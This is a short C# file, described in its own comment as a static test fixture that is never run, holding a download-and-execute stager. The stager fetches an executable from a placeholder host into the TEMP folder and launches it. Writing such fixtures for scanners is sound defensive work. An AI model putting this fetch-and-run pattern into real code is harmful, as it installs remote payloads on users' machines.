// Static fixture: an HTTP payload is written to a temporary executable and
// launched in the same short source block. It is never compiled or executed.
using System;
using System.Diagnostics;
using System.Net;

class Stager {
    static void Main() {
        var path = Environment.GetEnvironmentVariable("TEMP") + "\\stage.exe";
        var client = new WebClient(); client.DownloadFile("https://example.invalid/stage.exe", path);
        var start = new ProcessStartInfo(path) { UseShellExecute = false };
        Process.Start(start);
    }
}
